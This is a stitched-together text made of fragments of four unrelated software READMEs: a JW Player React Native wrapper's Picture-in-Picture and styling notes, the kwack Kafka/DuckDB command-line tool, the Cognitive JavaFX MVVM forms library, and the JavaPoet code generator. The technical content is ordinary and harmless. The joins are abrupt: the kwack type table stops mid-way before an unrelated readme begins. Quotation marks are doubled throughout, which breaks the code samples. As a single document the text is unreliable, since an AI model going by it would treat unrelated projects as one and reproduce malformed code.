   @Override
   public void onPictureInPictureModeChanged(boolean isInPictureInPictureMode, Configuration newConfig) {
    super.onPictureInPictureModeChanged(isInPictureInPictureMode, newConfig);

    Intent intent = new Intent(""onPictureInPictureModeChanged"");
    intent.putExtra(""isInPictureInPictureMode"", isInPictureInPictureMode);
    intent.putExtra(""newConfig"", newConfig);
    this.sendBroadcast(intent);
   }
   ```

<br />

#### iOS PiP

1. Read and understand the requirements for PiP in the [iOS SDK](https://docs.jwplayer.com/players/docs/ios-invoke-picture-in-picture-playback). PiP mode is enabled by JWP for the `PlayerViewController`.
2. (viewOnly:true only) Set the `pipEnabled` prop to `true`.
3. (viewOnly:true only) Call `togglePIP()` to enable or disable PiP.
4. Ensure [category](/docs//legacy_readme.md#audiosessioncategory) and/or [categoryOptions](/docs//legacy_readme.md#audiosessioncategoryoptions) prop(s) are set to define and configure your media. This is required to setup the audio session. If `category` is not defined but `pipEnabled` is set true, we default to the standard `playback` category to avoid crashing.  

<br /><br />

### Styling

[Android](#android-styling) | [iOS](#ios-styling)

#### Android Styling
The `styling` prop will not work when using the modern prop convention that matches the JWP Delivery API. Even when using the `forceLegacyConfig` prop, Android may not respect your choices.

Android styling is best handled through overring JWP IDs in your apps resources files. See the documentation [here](https://docs.jwplayer.com/players/docs/android-styling-guide). 

A sample of overring a color via XML can be seen in this [colors file](Example/android/app/src/main/res/values/colors.xml). The color specified here is the default, but if you wish to change it, the color will be updated on the player.

<br />

#### iOS Styling
You can use the styling elements as defined in the [Legacy Readme](/docs/legacy_readme.md#styling). 

<br /><br />

```

kwack shares many command-line options with [kcat](https://github.com/edenhill/kcat) (formerly kafkacat).
In addition, a file containing configuration properties can be used.  The available configuration properties 
are listed [here](https://github.com/rayokota/kwack/blob/master/src/main/java/io/kcache/kwack/KwackConfig.java).

Simply modify `config/kwack.properties` to point to an existing Kafka broker and Schema
Registry. Then run the following:

```bash
# Run with properties file
$ bin/kwack -F config/kwack.properties
```

Starting kwack is as easy as specifying a Kafka broker, topic, and Schema Registry URL:

```bash
$ bin/kwack -b mybroker -t mytopic -r http://schema-registry-url:8081
Welcome to kwack!
Enter ""!help"" for usage hints.

      ___(.)>
~~~~~~\___)~~~~~~

jdbc:duckdb::memory:>
```

When kwack starts, it will enter interactive mode, where you can enter SQL queries 
to analyze Kafka data.  For non-interactive mode, specify a query on the command line:

```bash
$ bin/kwack -b mybroker -t mytopic -r http://schema-registry-url:8081 -q ""SELECT * FROM mytopic""
```

The output of the above command will be in JSON, and so can be piped to other commands like jq.

One can load multiple topics, and then perform a query that joins the resulting tables on a common 
column:

```bash
$ bin/kwack -b mybroker -t mytopic -t mytopic2 -r http://schema-registry-url:8081 -q ""SELECT * FROM mytopic JOIN mytopic2 USING (col1)""
```

One can convert Kafka data into Parquet format by using the COPY commmand in DuckDB:

```bash
$ bin/kwack -b mybroker -t mytopic -r http://schema-registry-url:8081 -q ""COPY mytopic to 'mytopic.parquet' (FORMAT 'parquet')""
```

If not using Confluent Schema Registry, one can pass an external schema:

```bash
$ bin/kwack -b mybroker -t mytopic -v mytopic=proto:@/path/to/myschema.proto
```

For a given schema, kwack will create DuckDB columns based on
the appropriate Avro, Protobuf, or JSON Schema as follows:

|Avro | Protobuf | JSON Schema | DuckDB |
|-----|----------|-------------|--------|
|boolean | boolean | boolean | BOOLEAN |
|int | int32, sint32, sfixed32 || INTEGER |
|| uint32, fixed32 || UINTEGER |

# Cognitive
A lightweight JavaFX (21+) forms framework based on the MVVM UI architecture pattern.

View Model(s) maintain the state of a view (Form) and, in principle, should contain a controller's presentation logic.
MVVM allows the developer to test the presentation logic without having to wire up a JavaFX controller during runtime.

## Quick Start
To use Cognitive in your project, download and install Java 21+ JDK. The library depends on JavaFX 21+
To see the demo's code see [Form demo](https://github.com/carldea/cognitive/tree/main/src/test/java/org/carlfx/cognitive/test/demo)

*Gradle:*
```gradle
implementation 'org.carlfx:cognitive:1.5.0'
```

*Maven:*
```xml
<dependency>
    <groupId>org.carlfx</groupId>
    <artifactId>cognitive</artifactId>
    <version>1.5.0</version>
</dependency>
```

A project using Java Modules (JPMS) will want to do the following in the consuming module:
```java

requires org.carlfx.cognitive;

// open for FXML loaders
opens com.mycompany.myproject.controller to javafx.fxml, org.carlfx.cognitive;

```
As you can see, the opens allow FXML and Controller code to inject view models and UI controls using reflection.

# Introduction
Software developers creating form based applications will inevitably stumble across the single most important UI architectural design pattern [Model View Controller](http://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller) or **MVC** in short. This concept has paved the way for many frameworks which provide a good (acceptable) [separation of concerns.](http://en.wikipedia.org/wiki/Separation_of_concerns)

However, there are drawbacks to the MVC pattern (especially in JavaFX). One main drawback is that the controller layer can be difficult (if not impossible) to test. It is especially concerning when you are JavaFX developer who has worked with FXML and controller classes.

The pattern helps avoid coupling UI components, models (data) and presentation logic within a controller class. Because UI components are available during runtime it is difficult to test interactions (presentation logic) between the model and UI layers.

**So, what is a solution?**

You guessed it! The **MVVM** UI architecture pattern.

## What is MVVM?

MVVM is an architectural pattern that isolates the business logic/back-end data(Presentation Logic) from the view (UI code). Its goal is to simplify user interface development. According to Wikipedia, the [MVVM](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel) is a variation of [Martin Fowler](https://en.wikipedia.org/wiki/Martin_Fowler_(software_engineer))'s perspective of the [Presentation Model design pattern](https://martinfowler.com/eaDev/PresentationModel.html).

Next, let's see how to apply the MVVM UI pattern to an existing JavaFX Application

# Converting JavaFX MVC to the MVVM UI pattern

Before I show you how to convert a JavaFX MVC structure, let's compare the differences between MVC and the MVVM UI architecture patterns.

## MVC (Model View Controller)
Typically MVC is used in Java Swing or JavaFX UI form type apps.

JavaFX is MVC-based, where developers often follow the [Supervising Controller Pattern](https://martinfowler.com/eaaDev/SupervisingPresenter.html). An excerpt describing the controller's ability to manipulate the view with more complex view logic:

> ""Supervising Controller uses a controller both to handle input response but also to manipulate the view to handle more complex view logic. It leaves simple view behavior to the declarative system, intervening only when effects are needed that are beyond what can be achieved declaratively.""

In the case of JavaFX, the declarative part would be FXML & CSS (XML representing the View).

JavaFX can also bind ([Properties API](https://dev.java/learn/javafx/properties/)) UI controls and listeners to synchronize the model data. While it is convenient to do this inside a controller(Presenter) class, the code is tightly coupled regarding presentation logic, (complex) view logic, and (possibly) business logic, making code difficult to maintain, debug, and test.

It is difficult to test especially when many UI controls are realized (dependency injected) during runtime, such as `@FXML` annotated UI controls inside controller classes.

![mvc-ui-pattern](https://github.com/carldea/cognitive/assets/1594624/b8d811a2-cab6-4ac4-aa0e-5778a03e0d0b)

Now, let's look at the MVVM pattern and how it differs.

## MVVM (Model View ViewModel)
The MVVM UI pattern is a variation of the [Presentation Model Pattern](https://martinfowler.com/eaaDev/PresentationModel.html). Both MVVM and Presentation Model pattern both achieve the separation of the **View** and the **Model**. An excerpt from Martin Fowler's section on **When to use it?**
> ""Presentation Model allows you to write logic completely independent of the views used for display. You also do not need to rely on the view to store state.""

What's important is that the `ViewModel` manages the state. Later, we'll look at how to bind data between the View and ViewModel to synchronize model data.

The following is how MVVM is normally depected:

![mvvm-ui-pattern](https://github.com/carldea/cognitive/assets/1594624/6e290bc4-2b5e-475f-991f-291b196e207f)

As you will notice, the **model** does not update the view layer, which he main difference between MVVM and MVC.

The main advantage is testing **presentation logic** separately from the UI form and its associated JavaFX Controller class.

Now that you've seen the pros and cons between MVC and MVVM how do we conceptually convert a JavaFX MVC UI form into the MVVM pattern?

**Hint:**  Refactor (pull out) presentation logic and business logic away from JavaFX controllers into ViewModels or Model (services).

## Converting a JavaFX MVC Form UI using the MVVM pattern
Below is a conceptual way to think of JavaFX using the MVVM UI pattern.

Cognitive is an un-opinionated library that let's you to refactor things at your own pace. As you get comfortable, you'll notice that JavaFX controller classes contain less code where presentation logic is move off to the ViewModels.

![javafx-mvvm-ui-pattern](https://github.com/carldea/cognitive/assets/1594624/aa922411-e4fb-456a-93bc-6f8c7a333ad7)


As shown above, you can treat the JavaFX FXML & Controller class as the **View**, and the Model will remain the same. The only difference is that the ViewModels will contain much of the state of the UI form and presentation logic. The objective is to make the view very stupid.

Now that you know conceptually, let's look at a code example of an MVC-style controller with a save operation.

### This is a typical controller without the use of a view model.
Below is an example of how a UI form is about to save data.
```java
/**
 * User clicks on save button to save contact information.
 * @param ae event 
 */
@FXML
private void saveAction(ActionEvent ae) {
   // copy user's input
   String firstName = firstNameTextField.getText();
   String lastName = lastNameTextField.getText();
   
   // validate user's input
   // if valid write to database and reset ui.
   // db.write(new Person(firstName, lastName));

}
```
Now, let's look at how to use a view model in a controller class.

### Using ValidationViewModels in a controller
Using view models, you can have presentation logic or business logic. When testing presentation logic, you can populate a view model with the correct values without modifying the UI. Remember, a view model does not contain any UI controls. Shown below is an example of using a view model.

```java

@FXML
private void initialize() {
   firstNameTextField.textProperty().bidirectionalBind(personViewModel.getProperty(FIRST_NAME));
   lastNameTextField.textProperty().bidirectionalBind(personViewModel.getProperty(LAST_NAME));
}

@FXML
private void saveAction(ActionEvent ae) {
    personViewModel.save(); // validates
    if (personViewModel.hasErrorMsgs()) {
       // apply messages to badges or decorate control for fields or global messages.  
    } else {
       // view model get model values and has logic to persist data.
       String firstName = personViewModel.getValue(FIRST_NAME);
       String lastName = personViewModel.getValue(LAST_NAME);
       // personViewModel.writePerson(new Person(firstName, lastName)); 
    }
}
```
Above you can see there are 4 steps to using View Models:

1. **Binding** - Bind JavaFX controls and their properties to the view model's properties (property value layer).
2. **Validation** - Upon `saveAction()` method perform a view model's `save()` method (which calls the `validate()` method)
3. **Error Messages** - Check if there are any error messages if so, these can be applied to controls for user feedback.
4. **Model Values** - Once you have **valid** values (model value layer) the code calls to view model's `.getValue()` method to return raw values.
   NOTE: Think of a view model with **two layers** a **Property Values** and **Model Values**. ValidationViewModel`'s save
   Now that you see, much of the work uses view models instead of methods or UI code inside the controller class. The developer aims to remove state and presentation logic from the controller class.

Let's look at the two main implementations of the ViewModel interface SimpleViewModel and ValidationViewModel.

## `SimpleViewModel`
Let's start by creating a `SimpleViewModel` with one property with a String such as a first name. The objective is
To create a JavaFX text field and bind the value with a view model's property.

To bind properties do the following:
```java
final String FIRST_NAME = ""firstName"";

// A text field
var firstNameTextField = new TextField();

// Create a 
var personVm = new SimpleViewModel()
        .addProperty(FIRST_NAME, """");

// Bidirectional bind of the first name property and text field's text property.
firstNameTextField.textProperty().bidirectional(personVm.getProperty(FIRST_NAME));

// Set view model property value.
personVm.setPropertyValue(FIRST_NAME, ""Fred"");

// Output Text field's text property
System.out.println(""First name = "" + firstNameTextField.getText());
```

Output:

```text
First name = Fred
```
As you can see whenever a user enters text into the text field (`TextField`) the view model's property (first name) gets populated and visa-versa.

Usually if you have a UI Form that has read-only or no validation needed a `SimpleViewModel` can be used. A form controls bound to properties on a view model you can call the `reset()` method to copy initial model values back into the property values, thus clearing the screen. The `save()` method
will copy the property values into the model values layer. For simple UIs you can validate fields manually.

## `ValidationViewModel`

Next, let's look at ValidationViewModel(s). These allow the developer to add validation to properties. The following example
shows you how to create properties and add validators. These use cases are typically when a user is about to save information. Here they would need to validate before obtaining model values. New in version 1.3.0 are **Enums** as property names!

```java
public enum PersonField {
    FIRST_NAME(""First Name""),
    LAST_NAME(""Last Name""),
    AGE(""Age""),
    PHONE(""Phone""),
    HEIGHT(""Height""),
    COLORS(""Colors""),
    FOODS(""Foods""),
    THING(""thing""),
    MPG(""Mpg""),
    CUSTOM_PROP(""Custom Prop"");

    public final String name;
    PersonField(String name){
        this.name = name;
    }
}

var personVm = new ValidationViewModel()
        .addProperty(FIRST_NAME, """")
        .addValidator(FIRST_NAME, FIRST_NAME.name(), (ReadOnlyStringProperty prop, ViewModel vm) -> {
            if (prop.isEmpty().get()) {
                return new ValidationMessage(FIRST_NAME, MessageType.ERROR, ""${%s} is required"".formatted(FIRST_NAME));
            }
            return VALID;
        })
        // Adding multiple validation messages
        .addValidator(FIRST_NAME, FIRST_NAME.name(), (ReadOnlyStringProperty prop, ValidationResult validationResult, ViewModel viewModel) -> {
            if (prop.isEmpty().get() || prop.isNotEmpty().get() && prop.get().length() < 3) {
                validationResult.error(""${%s} must be greater than 3 characters."".formatted(FIRST_NAME));
            }
            String firstChar = String.valueOf(prop.get().charAt(0));
            if (firstChar.equals(firstChar.toLowerCase())) {
                validationResult.error(""${%s} first character must be upper case."".formatted(FIRST_NAME));
            }
        })
        .addProperty(PHONE, ""111-1111111"")
        .addValidator(PHONE, PHONE.name(), (ReadOnlyStringProperty prop, ValidationResult validationResult, ViewModel vm) -> {
            String ph = prop.get();
            Pattern pattern = Pattern.compile(""([0-9]{3}\\-[0-9]{3}\\-[0-9]{4})"");
            Matcher matcher = pattern.matcher(ph);
            if (!matcher.matches()) {
                validationResult.error(""${%s} must be formatted XXX-XXX-XXXX. Entered as %s"".formatted(PHONE, ph);
            }
        });

// validate view model
personVm.validate();

if (personVm.hasErrors()) {
   for (ValidationMessage vMsg : personVm.getValidationMessages()) {
      System.out.println(""msg Type: %s errorcode: %s, msg: %s"".formatted(vMsg.messageType(), vMsg.errorCode(), vMsg.interpolate(personVm)) );
   }
}

```
Output:

```text
msg Type: ERROR errorcode: -1, msg: First Name is required
msg Type: ERROR errorcode: -1, msg: First Name must be greater than 3 characters.
msg Type: ERROR errorcode: -1, msg: Phone Number must be formatted XXX-XXX-XXXX. Entered as 111-1111111

```
Above you'll notice the first name field is required and must be more than 3 characters. The phone number is formatted incorrectly.

As each validation message contains a property of the field in question the code can create decorators or badges affixed on a UI control to allow the user to see the error or warning.
```java
ValidationMessage vMsg = ...;
Label firstNameError = ...;
if (FIRST_NAME.equals(vMsg.propertyName())) {
    firstNameError.setText(vMsg.message());
}

```
Now let's fix the validation issues but instead of calling `validate()` you should call `save()`. A `ValidatationViewModel` overrides the `SimpleViewModel`'s `save()` method.

The `save()` method essentially copies property values into the model value layer. Since a call to the `validate()` method happens before the `save()` method, property values will not be copied when errors occur.

```java
personVm.setPropertyValue(FIRST_NAME, ""Fred"");
personVm.setPropertyValue(PHONE, ""123-867-5309"");
personVm.save();

```

The correct thing to do is obtain the view model's model values by calling the following:

```java
if (personVm.hasErrorMsgs()) {
   return;
}
// Valid!
// Obtain valid values from the view model.
String validFirstName = personVm.getValue(FIRST_NAME); // You should not use personVm.getPropertyValue(FIRST_NAME);

// Write to database 
db.write(...);

```
You can think of the property values of a view model used for the form ui and the model values used on the backend.

## How to inject view models into JavaFX controllers?

When creating JavaFX controller classes you can add view models by using the annotation as follows:

```java
// ... A controllers instance variables

@InjectViewModel
SimpleViewModel personViewModel;

```
When you've created a FXML (view) and a controller you must use the `FXMLMvvmLoader.make()` facility.

```java
Config config = ...;
JFXNode<Pane, PersonController> personJFXNode = FXMLMvvmLoader.make(config);
Pane personPane = personJFXNode.node();
PersonController personController = personJFXNode.controller();
// perform work

```
## Demo - Account Creation Form

Here's a demo UI form without values. As a user types into fields, the **validator** for populating the form will update the submit button state. If any fields are not populated, the save button will be disabled.

When pressing the submit button the validation behavior occurs afterwards. To see the demo's code see [Form demo](https://github.com/carldea/cognitive/tree/main/src/test/java/org/carlfx/cognitive/test/demo)

![demo1](https://github.com/carldea/cognitive/assets/1594624/320c19f2-6545-4f43-8762-522ec0100b93)

Input in error (after save to validate)

<img width=""432"" alt=""demo2"" src=""https://github.com/carldea/cognitive/assets/1594624/069d2af3-fd24-469b-88a2-2cc28d08d2ac"">

When the submit is pressed show the overlay icons for each field with an error.

<img width=""595"" alt=""demo3"" src=""https://github.com/carldea/cognitive/assets/1594624/ced72d75-6681-4d42-a5c8-974ea70cab6f"">

As you can see the user entered an initial character as an upper case 'F' only one error message alerts user that it must be 3 characters or more. With the new support of multiple error messages when using validator let show multiple messages related to the first name field.

Here are the following requirements or validation rules for First Name:
* Must not be blank
* Must be greater than 3 characters
* First character must be upper case

Let's enter one lowercase character into the First Name field and click on submit to evaluate error messages.
Shown below is the new support for multiple validation messages using ConsumerValidators.

<img width=""594"" alt=""Screenshot 2024-08-05 at 2 37 32 PM"" src=""https://github.com/user-attachments/assets/63478b27-2d7c-4017-862d-fea2bef45b32"">

Above you will notice the first name field the user entered one lowercase 'f' character getting 2 validation messages.
To see how to add multiple validation messages shown below is a `StringConsumerValidator` for the first name field.

```java
viewModel.addValidator(FIRST_NAME, ""First Name"", (ReadOnlyStringProperty prop, ValidationResult validationResult, ViewModel viewModel) -> {
   if (prop.isEmpty().get() || prop.isNotEmpty().get() && prop.get().length() < 3) {
      validationResult.error(FIRST_NAME, ""${%s} must be greater than 3 characters."".formatted(FIRST_NAME));
   }
   String firstChar = String.valueOf(prop.get().charAt(0));
   if (firstChar.equals(firstChar.toLowerCase())) {
       validationResult.error(FIRST_NAME, ""${%s} first character must be upper case."".formatted(FIRST_NAME));
   }
});
```

Now let's add correct data with valid input.

<img width=""488"" alt=""demo4"" src=""https://github.com/carldea/cognitive/assets/1594624/66c147a1-abc6-4ca7-b018-a4b6ba8b545c"">

# New Features
Here are new features to simplify code in certain scenarios.

- Updating the view model after JFXNode object is FXML loaded. `JFXNode`'s `updateViewModel()` method.
- Getting the view model after JFXNode object is FXML loaded. `JFXNode`'s `getViewModel()` method.
- Running a code block when a property has changed. `ViewModel`'s `.doOnChange()` method. 
- Validate on change runs validators based on a property change. `ViewModel`'s
- Determine if Form is invalid. The `ValidationViewModel`'s `onInvalid()` method.
- Determine if Form is valid. `ValidationViewModel`'s `onValid()` method.

## `JFXNode`'s `updateViewModel()`
After calling the `FXMLMvvmLoader.make()` method a JFXNode object is returned representing the JavaFX Node and a Controller. Contained in the JFXNode (record) is a way to update the properties of a view model injected into the controller as shown in the code snippet below:
```java
JFXNode<Pane, AccountCreateController> jfxNode = FXMLMvvmLoader.make(config);

//  Modify a view model AFTER UI form was created and loaded.
jfxNode.updateViewModel(""accountViewModel"", (viewModel) ->
   viewModel.setPropertyValue(EMAIL, ""test123""));
```
Above your notice the `updateViewModel()` method takes the variable name inside the controller and a lambda containing the view model to be modified.

## `JFXNode`'s `getViewModel()`
After calling the `FXMLMvvmLoader.make()` method a JFXNode object is returned representing the JavaFX Node and a Controller. Contained in the JFXNode (record) is a way to get a view model previously injected into the controller as shown in the code snippet below:
```java
JFXNode<Pane, AccountCreateController> jfxNode = FXMLMvvmLoader.make(config);

//  Another way to modify a view model AFTER UI form was loaded.
Optional<AccountViewModel> accountViewModel = jfxNode.getViewModel(""accountViewModel"");

```
Above your notice the `getViewModel()` method takes the variable name and returns an `Optional` instance.

## `ViewModel`'s `.doOnChange()`
Did you ever just want to run a code block when a property value has changed? Now you can with the following:
```java
// fields change fire a validation
accountViewModel.doOnChange(()->{
       accountViewModel.validate();
}, FIRST_NAME, LAST_NAME, EMAIL);
```
Above you'll notice a lambda (Runnable) to be executed when the properties first name, last name and email property values change.

## Validate when a property changes. `ViewModel`'s `validateOnChange()` method.
When a property value has changed its validators get run and any validation messages will be passed to help update the UI. Below is an example of decorating an icon overlay on the first name field to provide user feedback of the error.
```java
// Does not decorate field initially. As user types validation occurs for field.
accountViewModel.validateOnChange(FIRST_NAME, (validationMessages) -> {
    // clear decoration UI code.
    firstNameTooltip.setText("""");
    firstNameErrorOverlay.setVisible(!validationMessages.isEmpty());

    // process each message owned by Field
    validationMessages.forEach(validationMessage -> {
       // show overlay and update tooltip
       accountViewModel.updateErrors(validationMessage);

       String message = validationMessage.interpolate(accountViewModel);

       // concatenate. Update UI
       firstNameTooltip.setText(firstNameTooltip.getText() + message + ""\n"");
    });
});
```
Above you'll notice it clears the tooltip and error overlay, then it concatenates the error messages to be shown to the user.

## The invalid property of a ValidationViewModel. `ValidationViewModel`'s `invalidProperty()` method
The invalid property detects (true) when there are validation messages otherwise it is false. This is often used to validate the whole form and disabling or enabling a save button as shown below.

```java
// button disable property is bound to invalid property.
submitButton.disableProperty().bind(accountViewModel.invalidProperty());
```
Above you'll notice a JavaFX Button's **disable** property is bound to the **invalid** property.
Also, this gets set based on the following code: 

```java
// fields change fire a validation
accountViewModel.doOnChange(()-> {
    accountViewModel.validate();
}, FIRST_NAME, LAST_NAME, EMAIL);
```
When validate is run, the error messages are collected (greater than zero) the invalid property gets set to true.

## The valid property of a ValidationViewModel  `ValidationViewModel`'s `validProperty()` method
After a validation view model's `validate()` or `save()` method is called you can check if there are zero validation messages or not as shown below.

```java
// validate form
accountViewModel.validate();

// is valid
if (accountViewModel.validProperty().get()) {
   // success!!!
}
```

# JavaPoet

`JavaPoet` is a Java API for generating `.java` source files.

Source file generation can be useful when doing things such as annotation processing or interacting
with metadata files (e.g., database schemas, protocol formats). By generating code, you eliminate
the need to write boilerplate while also keeping a single source of truth for the metadata.

_This repo is forked from the excellent [square/javapoet](https://github.com/square/javapoet) project which is [no longer actively maintained](https://github.com/square/javapoet/discussions/866)._\
Significant changes:

- Changed package name to `com.palantir.javapoet`
- Made implementation-specific fields `private` and instead added getter methods
- Added support for record classes (`TypeSpec#recordBuilder`)
- Added support for permitted subclasses of `sealed` types (`TypeSpec.Builder#addPermittedSubclass`)

## Download

Gradle:

```kotlin
implementation(""com.palantir.javapoet:javapoet:<version>"")
```

Maven:

```xml
<dependency>
    <groupId>com.palantir.javapoet</groupId>
    <artifactId>javapoet</artifactId>
    <version>$version$</version>
</dependency>

```


## Example

Here's a (boring) `HelloWorld` class:

```java
package com.example.helloworld;

public final class HelloWorld {
  public static void main(String[] args) {
    System.out.println(""Hello, JavaPoet!"");
  }
}
```

And this is the (exciting) code to generate it with JavaPoet:

```java
MethodSpec main = MethodSpec.methodBuilder(""main"")
    .addModifiers(Modifier.PUBLIC, Modifier.STATIC)
    .returns(void.class)
    .addParameter(String[].class, ""args"")
    .addStatement(""$T.out.println($S)"", System.class, ""Hello, JavaPoet!"")
    .build();

TypeSpec helloWorld = TypeSpec.classBuilder(""HelloWorld"")
    .addModifiers(Modifier.PUBLIC, Modifier.FINAL)
    .addMethod(main)
    .build();

JavaFile javaFile = JavaFile.builder(""com.example.helloworld"", helloWorld)
    .build();

javaFile.writeTo(System.out);
```

To declare the main method, we've created a `MethodSpec` ""main"" configured with modifiers, return
type, parameters and code statements. We add the main method to a `HelloWorld` class, and then add
that to a `HelloWorld.java` file.

In this case we write the file to `System.out`, but we could also get it as a string
(`JavaFile.toString()`) or write it to the file system (`JavaFile.writeTo()`).

## Code & Control Flow

Most of JavaPoet's API uses plain old immutable Java objects. There's also builders, method chaining
and varargs to make the API friendly. JavaPoet offers models for classes & interfaces (`TypeSpec`),
fields (`FieldSpec`), methods & constructors (`MethodSpec`), parameters (`ParameterSpec`) and
annotations (`AnnotationSpec`).

But the _body_ of methods and constructors is not modeled. There's no expression class, no
statement class or syntax tree nodes. Instead, JavaPoet uses strings for code blocks:

```java
MethodSpec main = MethodSpec.methodBuilder(""main"")
    .addCode(""""
        + ""int total = 0;\n""
        + ""for (int i = 0; i < 10; i++) {\n""
        + ""  total += i;\n""
        + ""}\n"")
    .build();
```

Which generates this:

```java
void main() {
  int total = 0;
  for (int i = 0; i < 10; i++) {
    total += i;
  }
}
```

The manual semicolons, line wrapping, and indentation are tedious and so JavaPoet offers APIs to
make it easier. There's `addStatement()` which takes care of semicolons and newline, and
`beginControlFlow()` + `endControlFlow()` which are used together for braces, newlines, and
indentation:

```java
MethodSpec main = MethodSpec.methodBuilder(""main"")
    .addStatement(""int total = 0"")
    .beginControlFlow(""for (int i = 0; i < 10; i++)"")
    .addStatement(""total += i"")
    .endControlFlow()
    .build();
```

This example is lame because the generated code is constant! Suppose instead of just adding 0 to 10,
we want to make the operation and range configurable. Here's a method that generates a method:

```java
private MethodSpec computeRange(String name, int from, int to, String op) {
  return MethodSpec.methodBuilder(name)
      .returns(int.class)
      .addStatement(""int result = 1"")
      .beginControlFlow(""for (int i = "" + from + ""; i < "" + to + ""; i++)"")
      .addStatement(""result = result "" + op + "" i"")
      .endControlFlow()
      .addStatement(""return result"")
      .build();
}
```

And here's what we get when we call `computeRange(""multiply10to20"", 10, 20, ""*"")`:

```java
int multiply10to20() {
  int result = 1;
  for (int i = 10; i < 20; i++) {
    result = result * i;
  }
  return result;
}
```

Methods generating methods! And since JavaPoet generates source instead of bytecode, you can
read through it to make sure it's right.

Some control flow statements, such as `if/else`, can have unlimited control flow possibilities.
You can handle those options using `nextControlFlow()`:

```java
MethodSpec main = MethodSpec.methodBuilder(""main"")
    .addStatement(""long now = $T.currentTimeMillis()"", System.class)
    .beginControlFlow(""if ($T.currentTimeMillis() < now)"", System.class)
    .addStatement(""$T.out.println($S)"", System.class, ""Time travelling, woo hoo!"")
    .nextControlFlow(""else if ($T.currentTimeMillis() == now)"", System.class)
    .addStatement(""$T.out.println($S)"", System.class, ""Time stood still!"")
    .nextControlFlow(""else"")
    .addStatement(""$T.out.println($S)"", System.class, ""Ok, time still moving forward"")
    .endControlFlow()
    .build();
```

Which generates:

```java
void main() {
  long now = System.currentTimeMillis();
  if (System.currentTimeMillis() < now)  {
    System.out.println(""Time travelling, woo hoo!"");
  } else if (System.currentTimeMillis() == now) {
    System.out.println(""Time stood still!"");
  } else {
    System.out.println(""Ok, time still moving forward"");
  }
}
```

Catching exceptions using `try/catch` is also a use case for `nextControlFlow()`:

```java
MethodSpec main = MethodSpec.methodBuilder(""main"")
    .beginControlFlow(""try"")
    .addStatement(""throw new Exception($S)"", ""Failed"")
    .nextControlFlow(""catch ($T e)"", Exception.class)
    .addStatement(""throw new $T(e)"", RuntimeException.class)
    .endControlFlow()
    .build();
```

Which produces:

```java
void main() {
  try {
    throw new Exception(""Failed"");
  } catch (Exception e) {
    throw new RuntimeException(e);
  }
}
```

## $L for Literals

The string-concatenation in calls to `beginControlFlow()` and `addStatement` is distracting. Too
many operators. To address this, JavaPoet offers a syntax inspired-by but incompatible-with
`String.format()`. It accepts **`$L`** to emit a **literal** value in the output. This
works just like `Formatter`'s `%s`:

```java
private MethodSpec computeRange(String name, int from, int to, String op) {
  return MethodSpec.methodBuilder(name)
      .returns(int.class)
      .addStatement(""int result = 0"")
      .beginControlFlow(""for (int i = $L; i < $L; i++)"", from, to)
      .addStatement(""result = result $L i"", op)
      .endControlFlow()
      .addStatement(""return result"")
      .build();
}
```

Literals are emitted directly to the output code with no escaping. Arguments for literals may be
strings, primitives, and a few JavaPoet types described below.

## $S for Strings

When emitting code that includes string literals, we can use **`$S`** to emit a **string**, complete
with wrapping quotation marks and escaping. Here's a program that emits 3 methods, each of which
returns its own name:

```java
public static void main(String[] args) throws Exception {
  TypeSpec helloWorld = TypeSpec.classBuilder(""HelloWorld"")
      .addModifiers(Modifier.PUBLIC, Modifier.FINAL)
      .addMethod(whatsMyName(""slimShady""))
      .addMethod(whatsMyName(""eminem""))
      .addMethod(whatsMyName(""marshallMathers""))
      .build();

  JavaFile javaFile = JavaFile.builder(""com.example.helloworld"", helloWorld)
      .build();

  javaFile.writeTo(System.out);
}

private static MethodSpec whatsMyName(String name) {
  return MethodSpec.methodBuilder(name)
      .returns(String.class)
      .addStatement(""return $S"", name)
      .build();
}
```

In this case, using `$S` gives us quotation marks:

```java
public final class HelloWorld {
  String slimShady() {
    return ""slimShady"";
  }

  String eminem() {
    return ""eminem"";
  }

  String marshallMathers() {
    return ""marshallMathers"";
  }
}
```

## $T for Types

We Java programmers love our types: they make our code easier to understand. And JavaPoet is on
board. It has rich built-in support for types, including automatic generation of `import`
statements. Just use **`$T`** to reference **types**:

```java
MethodSpec today = MethodSpec.methodBuilder(""today"")
    .returns(Date.class)
    .addStatement(""return new $T()"", Date.class)
    .build();

TypeSpec helloWorld = TypeSpec.classBuilder(""HelloWorld"")
    .addModifiers(Modifier.PUBLIC, Modifier.FINAL)
    .addMethod(today)
    .build();

JavaFile javaFile = JavaFile.builder(""com.example.helloworld"", helloWorld)
    .build();

javaFile.writeTo(System.out);
```

That generates the following `.java` file, complete with the necessary `import`:

```java
package com.example.helloworld;

import java.util.Date;

public final class HelloWorld {
  Date today() {
    return new Date();
  }
}
```

We passed `Date.class` to reference a class that just-so-happens to be available when we're
generating code. This doesn't need to be the case. Here's a similar example, but this one
references a class that doesn't exist (yet):

```java
ClassName hoverboard = ClassName.get(""com.mattel"", ""Hoverboard"");

MethodSpec today = MethodSpec.methodBuilder(""tomorrow"")
    .returns(hoverboard)
    .addStatement(""return new $T()"", hoverboard)
    .build();
```

And that not-yet-existent class is imported as well:

```java
package com.example.helloworld;

import com.mattel.Hoverboard;

public final class HelloWorld {
  Hoverboard tomorrow() {
    return new Hoverboard();
  }
}
```

The `ClassName` type is very important, and you'll need it frequently when you're using JavaPoet.
It can identify any _declared_ class. Declared types are just the beginning of Java's rich type
system: we also have arrays, parameterized types, wildcard types, and type variables. JavaPoet has
classes for building each of these:

```java
ClassName hoverboard = ClassName.get(""com.mattel"", ""Hoverboard"");
ClassName list = ClassName.get(""java.util"", ""List"");
ClassName arrayList = ClassName.get(""java.util"", ""ArrayList"");
TypeName listOfHoverboards = ParameterizedTypeName.get(list, hoverboard);

MethodSpec beyond = MethodSpec.methodBuilder(""beyond"")
    .returns(listOfHoverboards)
    .addStatement(""$T result = new $T<>()"", listOfHoverboards, arrayList)
    .addStatement(""result.add(new $T())"", hoverboard)
    .addStatement(""result.add(new $T())"", hoverboard)
    .addStatement(""result.add(new $T())"", hoverboard)
    .addStatement(""return result"")
    .build();
```

JavaPoet will decompose each type and import its components where possible.

```java
package com.example.helloworld;

import com.mattel.Hoverboard;
import java.util.ArrayList;
import java.util.List;

public final class HelloWorld {
  List<Hoverboard> beyond() {
    List<Hoverboard> result = new ArrayList<>();
    result.add(new Hoverboard());
    result.add(new Hoverboard());
    result.add(new Hoverboard());
    return result;
  }
}
```

### Import static

